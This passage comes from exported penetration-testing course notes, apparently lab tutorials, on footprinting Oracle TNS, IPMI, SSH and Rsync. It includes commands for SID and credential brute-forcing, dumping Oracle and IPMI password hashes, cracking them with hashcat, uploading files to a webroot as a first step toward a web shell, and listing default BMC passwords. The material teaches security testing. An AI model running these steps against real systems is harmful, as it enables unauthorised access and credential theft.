used.\n\nThe SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.\n\nThere are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.\n\n#### Nmap - SID Bruteforcing\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute\n\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST\nNmap scan report for 10.129.204.235\nHost is up (0.0044s latency).\n\nPORT     STATE SERVICE    VERSION\n1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)\n| oracle-sid-brute: \n|_  XE\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 55.40 seconds\n```\n\nWe can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.\n\n#### ODAT\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./odat.py all -s 10.129.204.235\n\n[+] Checking if target 10.129.204.235:1521 is well configured for a connection...\n[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...\n\n...SNIP...\n\n[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 \n[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 \n[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59\n[+] Valid credentials found: scott/tiger. Continue...\n\n...SNIP...\n```\n\nIn this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.\n\n#### SQLplus - Log In\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE\n\nSQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023\nVersion 21.4.0.0.0\n\nCopyright (c) 1982, 2021, Oracle. All rights reserved.\n\nERROR:\nORA-28002: the password will expire within 7 days\n\n\n\nConnected to:\nOracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production\n\nSQL> \n```\n\nIf you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo sh -c \"echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf\";sudo ldconfig\n```\n\nThere are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:\n\n#### Oracle RDBMS - Interaction\n\nOracle TNS\n\n```shell-session\nSQL> select table_name from all_tables;\n\nTABLE_NAME\n------------------------------\nDUAL\nSYSTEM_PRIVILEGE_MAP\nTABLE_PRIVILEGE_MAP\nSTMT_AUDIT_OPTION_MAP\nAUDIT_ACTIONS\nWRR$_REPLAY_CALL_FILTER\nHS_BULKLOAD_VIEW_OBJ\nHS$_PARALLEL_METADATA\nHS_PARTITION_COL_NAME\nHS_PARTITION_COL_TYPE\nHELP\n\n...SNIP...\n\n\nSQL> select * from user_role_privs;\n\nUSERNAME                       GRANTED_ROLE                   ADM DEF OS_\n------------------------------ ------------------------------ --- --- ---\nSCOTT                          CONNECT                        NO  YES NO\nSCOTT                          RESOURCE                       NO  YES NO\n```\n\nHere, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.\n\n#### Oracle RDBMS - Database Enumeration\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba\n\nSQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023\nVersion 21.4.0.0.0\n\nCopyright (c) 1982, 2021, Oracle. All rights reserved.\n\n\nConnected to:\nOracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production\n\n\nSQL> select * from user_role_privs;\n\nUSERNAME                       GRANTED_ROLE                   ADM DEF OS_\n------------------------------ ------------------------------ --- --- ---\nSYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO\nSYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO\nSYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO\nSYS                            AQ_USER_ROLE                   YES YES NO\nSYS                            AUTHENTICATEDUSER              YES YES NO\nSYS                            CONNECT                        YES YES NO\nSYS                            CTXAPP                         YES YES NO\nSYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO\nSYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO\nSYS                            DBA                            YES YES NO\nSYS                            DBFS_ROLE                      YES YES NO\n\nUSERNAME                       GRANTED_ROLE                   ADM DEF OS_\n------------------------------ ------------------------------ --- --- ---\nSYS                            DELETE_CATALOG_ROLE            YES YES NO\nSYS                            EXECUTE_CATALOG_ROLE           YES YES NO\n...SNIP...\n```\n\nWe can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline. The query for this would look like the following:\n\n#### Oracle RDBMS - Extract Password Hashes\n\nOracle TNS\n\n```shell-session\nSQL> select name, password from sys.user$;\n\nNAME                           PASSWORD\n------------------------------ ------------------------------\nSYS                            FBA343E7D6C8BC9D\nPUBLIC\nCONNECT\nRESOURCE\nDBA\nSYSTEM                         B5073FE1DE351687\nSELECT_CATALOG_ROLE\nEXECUTE_CATALOG_ROLE\nDELETE_CATALOG_ROLE\nOUTLN                          4A3BA55E08595C81\nEXP_FULL_DATABASE\n\nNAME                           PASSWORD\n------------------------------ ------------------------------\nIMP_FULL_DATABASE\nLOGSTDBY_ADMINISTRATOR\n...SNIP...\n```\n\nAnother option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:\n\n|**OS**|**Path**|\n|---|---|\n|Linux|`/var/www/html`|\n|Windows|`C:\\inetpub\\wwwroot`|\n\nFirst, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.\n\n#### Oracle RDBMS - File Upload\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo \"Oracle File Upload Test\" > testing.txt\ndrxh3kr@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt\n\n[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\\inetpub\\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  \n[+] The ./testing.txt file was created on the C:\\inetpub\\wwwroot directory on the 10.129.204.235 server like the testing.txt file\n```\n\nFinally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt\n\nOracle File Upload Test\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/17-IPMI",
    "path": "02_CPTS/03-Footprinting/17-IPMI.md",
    "title": "17 IPMI",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous ...",
    "category": "02_CPTS",
    "content": "[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:\n\n- Before the OS has booted to modify BIOS settings\n- When the host is fully powered down\n- Access to a host after a system failure\n\nWhen not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.\n\nThe IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band. To function, IPMI requires the following components:\n\n- Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI\n- Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another\n- Intelligent Platform Management Bus (IPMB) - extends the BMC\n- IPMI Memory - stores things such as the system event log, repository store data, and more\n- Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus\n\n---\n\n## Footprinting the Service\n\nIPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol. Below is a sample Nmap scan using the Nmap [ipmi-version](https://nmap.org/nsedoc/scripts/ipmi-version.html) NSE script to footprint the service.\n\n#### Nmap\n\nIPMI\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT\nNmap scan report for ilo.inlanfreight.local (172.16.2.2)\nHost is up (0.00064s latency).\n\nPORT    STATE SERVICE\n623/udp open  asf-rmcp\n| ipmi-version:\n|   Version:\n|     IPMI-2.0\n|   UserAuth:\n|   PassAuth: auth_user, non_null_user\n|_  Level: 2.0\nMAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)\n\nNmap done: 1 IP address (1 host up) scanned in 0.46 seconds\n```\n\nHere, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).\n\n#### Metasploit Version Scan\n\nIPMI\n\n```shell-session\nmsf6 > use auxiliary/scanner/ipmi/ipmi_version \nmsf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_version) > show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_version):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to probe in each set\n   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      623              yes       The target port (UDP)\n   THREADS    10               yes       The number of concurrent threads\n\n\nmsf6 auxiliary(scanner/ipmi/ipmi_version) > run\n\n[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)\n[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) \n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\nDuring internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:\n\n|Product|Username|Password|\n|---|---|---|\n|Dell iDRAC|root|calvin|\n|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|\n|Supermicro IPMI|ADMIN|ADMIN|\n\nIt is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.\n\n---\n\n## Dangerous Settings\n\nIf default credentials do not work to access a BMC, we can turn to a [flaw](http://fish2.com/ipmi/remote-pw-cracking.html) in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using `Hashcat` mode `7300`. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` which tries all combinations of upper case letters and numbers for an eight-character password.\n\nThere is no direct \"fix\" to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.\n\nTo retrieve IPMI hashes, we can use the Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) module.\n\n#### Metasploit Dumping Hashes\n\nIPMI\n\n```shell-session\nmsf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes \nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_dumphashes):\n\n   Name                 Current Setting                                                    Required  Description\n   ----                 ---------------                                                    --------  -----------\n   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained\n   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format\n   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format\n   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line\n   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT                623                                                                yes       The target port\n   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)\n   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line\n\n\n\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run\n\n[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e\n[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\nExperimenting with different word lists is crucial for obtaining the password from the acquired hash.\n\nHere we can see that we have successfully obtained the password hash for the user `ADMIN`, and the tool was able to quickly crack it to reveal what appears to be a default password `ADMIN`. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/18-Linux Remote Management Protocols",
    "path": "02_CPTS/03-Footprinting/18-Linux Remote Management Protocols.md",
    "title": "18 Linux Remote Management Protocols",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "In the world of Linux distributions, there are many ways to manage the servers remotely. For example, let us imagine that we are in one of many locations and one of our employees who just went to a cu...",
    "category": "02_CPTS",
    "content": "In the world of Linux distributions, there are many ways to manage the servers remotely. For example, let us imagine that we are in one of many locations and one of our employees who just went to a customer in another city needs our help because of an error that he cannot solve. Efficient troubleshooting will look difficult over a phone call in most cases, so it is beneficial if we know how to log onto the remote system to manage it.\n\nThese applications and services can be found on almost every server in the public network. It is time-saving since we do not have to be physically present at the server, and the working environment still looks the same. These protocols and applications for remote systems management are an exciting target for these reasons. If the configuration is incorrect, we, as penetration testers, can even quickly gain access to the remote system. Therefore, we should familiarize ourselves with the most important protocols, servers, and applications for this purpose.\n\n---\n\n## SSH\n\n[Secure Shell](https://en.wikipedia.org/wiki/Secure_Shell) (`SSH`) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port `TCP 22`. This is necessary to prevent third parties from intercepting the data stream and thus intercepting sensitive data. The SSH server can also be configured to only allow connections from specific clients. An advantage of SSH is that the protocol runs on all common operating systems. Since it is originally a Unix application, it is also implemented natively on all Linux distributions and MacOS. SSH can also be used on Windows, provided we install an appropriate program. The well-known [OpenBSD SSH](https://www.openssh.com/) (`OpenSSH`) server on Linux distributions is an open-source fork of the original and commercial `SSH` server from SSH Communication Security. Accordingly, there are two competing protocols: `SSH-1` and `SSH-2`.\n\n`SSH-2`, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, `SSH-1` is vulnerable to `MITM` attacks, whereas SSH-2 is not.\n\nWe can imagine that we want to manage a remote host. This can be done via the command line or GUI. Besides, we can also use the SSH protocol to send commands to the desired system, transfer files, or do port forwarding. Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it. In total, OpenSSH has six different authentication methods:\n\n1. Password authentication\n2. Public-key authentication\n3. Host-based authentication\n4. Keyboard authentication\n5. Challenge-response authentication\n6. GSSAPI authentication\n\nWe will take a closer look at and discuss one of the most commonly used authentication methods. In addition, we can learn more about the other authentication methods [here](https://www.golinuxcloud.com/openssh-authentication-methods-sshd-config/) among others.\n\n#### Public Key Authentication\n\nIn a first step, the SSH server and client authenticate themselves to each other. The server sends its `public host key` to the client, which the client uses to verify the server's identity. Only when contact is first established there is a risk of a third party interposing itself between the two participants and thus intercepting the connection. A `host key` cannot be imitated because it is a unique public-private `key pair`, and an attacker cannot forge the private key’s signature without access to it, assuming the client properly verifies the public key against a trusted source.\n\nAfter server authentication, however, the client must also prove to the server that it has access authorization. However, the SSH server is already in possession of the encrypted hash value of the password set for the desired user. As a result, users have to enter the password every time they log on to another server during the same session. For this reason, an alternative option for client-side authentication is the use of a public key and private key pair.\n\nThe private key is created individually for the user's own computer and secured with a passphrase that should be longer than a typical password. The private key is stored exclusively on our own computer and always remains secret. If we want to establish an SSH connection, we first enter the passphrase and thus open access to the private key.\n\nPublic keys are also stored on the server. The server creates a cryptographic problem with the client's public key and sends it to the client. The client, in turn, decrypts the problem with its own private key, sends back the solution, and thus informs the server that it may establish a legitimate connection. During a session, users only need to enter the passphrase once to connect to any number of servers. At the end of the session, users log out of their local machines, ensuring that no third party who gains physical access to the local machine can connect to the server.\n\n---\n\n## Default Configuration\n\nThe [sshd_config](https://www.ssh.com/academy/ssh/sshd_config) file, responsible for the OpenSSH server, has only a few of the settings configured by default. However, the default configuration includes X11 forwarding, which contained a command injection vulnerability in version 7.2p1 of OpenSSH in 2016. Nevertheless, we do not need a GUI to manage our servers.\n\n#### Default Configuration\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/ssh/sshd_config  | grep -v \"#\" | sed -r '/^\\s*$/d'\n\nInclude /etc/ssh/sshd_config.d/*.conf\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem       sftp    /usr/lib/openssh/sftp-server\n```\n\nMost settings in this configuration file are commented out and require manual configuration.\n\n---\n\n## Dangerous Settings\n\nDespite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:\n\n|**Setting**|**Description**|\n|---|---|\n|`PasswordAuthentication yes`|Allows password-based authentication.|\n|`PermitEmptyPasswords yes`|Allows the use of empty passwords.|\n|`PermitRootLogin yes`|Allows to log in as the root user.|\n|`Protocol 1`|Uses an outdated version of encryption.|\n|`X11Forwarding yes`|Allows X11 forwarding for GUI applications.|\n|`AllowTcpForwarding yes`|Allows forwarding of TCP ports.|\n|`PermitTunnel`|Allows tunneling.|\n|`DebianBanner yes`|Displays a specific banner when logging in.|\n\nAllowing password authentication allows us to brute-force a known username for possible passwords. Many different methods can be used to guess the passwords of users. For this purpose, specific `patterns` are usually used to mutate the most commonly used passwords and, frighteningly, correct them. This is because we humans are lazy and do not want to remember complex and complicated passwords. Therefore, we create passwords that we can easily remember, and this leads to the fact that, for example, numbers or characters are added only at the end of the password. Believing that the password is secure, the mentioned patterns are used to guess precisely such \"adjustments\" of these passwords. However, some instructions and [hardening guides](https://www.ssh-audit.com/hardening_guides.html) can be used to harden our SSH servers.\n\n---\n\n## Footprinting the Service\n\nOne of the tools we can use to fingerprint the SSH server is [ssh-audit](https://github.com/jtesta/ssh-audit). It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.\n\n#### SSH-Audit\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit\ndrxh3kr@htb[/htb]$ ./ssh-audit.py 10.129.14.132\n\n# general\n(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\n(gen) software: OpenSSH 8.2p1\n(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+\n(gen) compression: enabled (zlib@openssh.com)                                   \n\n# key exchange algorithms\n(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76                            \n(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp256                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp384                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) ecdh-sha2-nistp521                    -- [fail] using weak elliptic curves\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4\n(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73\n(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3\n(kex) diffie-hellman-group14-sha256         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73\n\n# host-key algorithms\n(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2\n(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2\n(key) ssh-rsa (3072-bit)                    -- [fail] using weak hashing algorithm\n                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28\n                                            `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2\n(key) ecdsa-sha2-nistp256                   -- [fail] using weak elliptic curves\n                                            `- [warn] using weak random number generator could reveal the key\n                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62\n(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5\n...SNIP...\n```\n\nThe first thing we can see in the first few lines of the output is the banner that reveals the version of the OpenSSH server. The previous versions had some vulnerabilities, such as [CVE-2020-14145](https://www.cvedetails.com/cve/CVE-2020-14145/), which allowed the attacker the capability to Man-In-The-Middle and attack the initial connection attempt. The detailed output of the connection setup with the OpenSSH server can also often provide important information, such as which authentication methods the server can use.\n\n#### Change Authentication Method\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132\n\nOpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020\ndebug1: Reading configuration data /etc/ssh/ssh_config \n...SNIP...\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\n```\n\nFor potential brute-force attacks, we can specify the authentication method with the SSH client option `PreferredAuthentications`.\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password\n\nOpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020\ndebug1: Reading configuration data /etc/ssh/ssh_config\n...SNIP...\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\ndebug1: Next authentication method: password\n\ncry0l1t3@10.129.14.132's password:\n```\n\nEven with this obvious and secure service, we recommend setting up our own OpenSSH server on our VM, experimenting with it, and familiarizing ourselves with the different settings and options.\n\nWe may encounter various banners for the SSH server during our penetration tests. By default, the banners start with the version of the protocol that can be applied and then the version of the server itself. For example, with `SSH-1.99-OpenSSH_3.9p1`, we know that we can use both protocol versions SSH-1 and SSH-2, and we are dealing with OpenSSH server version 3.9p1. On the other hand, for a banner with `SSH-2.0-OpenSSH_8.2p1`, we are dealing with an OpenSSH version 8.2p1 which only accepts the SSH-2 protocol version.\n\n---\n\n## Rsync\n\n[Rsync](https://linux.die.net/man/1/rsync) is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port `873` and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.\n\nThis [guide](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) covers some of the ways Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.\n\nLet's do a bit of quick footprinting. We can see that Rsync is in use using protocol 31.\n\n#### Scanning for Rsync\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sV -p 873 127.0.0.1\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 09:31 EDT\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.0058s latency).\n\nPORT    STATE SERVICE VERSION\n873/tcp open  rsync   (protocol version 31)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.13 seconds\n```\n\n#### Probing for Accessible Shares\n\nWe can next probe the service a bit to see what we can gain access to.\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -nv 127.0.0.1 873\n\n(UNKNOWN) [127.0.0.1] 873 (rsync) open\n@RSYNCD: 31.0\n@RSYNCD: 31.0\n#list\ndev            \tDev Tools\n@RSYNCD: EXIT\n```\n\n#### Enumerating an Open Share\n\nHere we can see a share called `dev`, and we can enumerate it further.\n\nLinux Remote Management Protocols\n\n```shell-session\ndrxh3kr@htb[/htb]$ rsync -av --list-only rsync://127.0.0.1/dev\n\nreceiving incremental file list\ndrwxr-xr-x             48 2022/09/19 09:43:10 .\n-rw-r--r--              0 2022/09/19 09:34:50 build.sh\n-rw-r--r--              0 2022/09/19 09:36:02 secrets.yaml\ndrwx------             54 2022/09/19 09:43:10 .ssh\n\nsent 25 bytes  received 221 bytes  492.00 bytes/sec\ntotal size is 0  speedup is 0.00\n```\n\nFrom the above output, we can see a few interesting files that may be worth pulling down to investigate further. We can also see that a directory likely containing SSH keys is accessible. From here, we could sync all files to our attack host with the command `rsync -av rsync://127.0.0.1/dev`. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the `-e ssh` flag, or `-e \"ssh -p2222\"` if a non-standard port is in use for SSH. This [guide](https://phoenixnap.com/kb/how-to-rsync-over-ssh) is helpful for understanding the syntax for using Rsync over SSH.\n\n---\n\n## R-Services\n\nR-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP. Initially developed by the Computer Systems Research Group (`CSRG`) at the University of California, Berkeley, `r-services` were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (`SSH`) protocols and commands due to inherent security flaws built into them. Much like `telnet`, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (`MITM`) attacks.\n\n`R-services` span across the ports `512`, `513`, and `514` and are only accessible through a suite of programs known as `r-commands`. 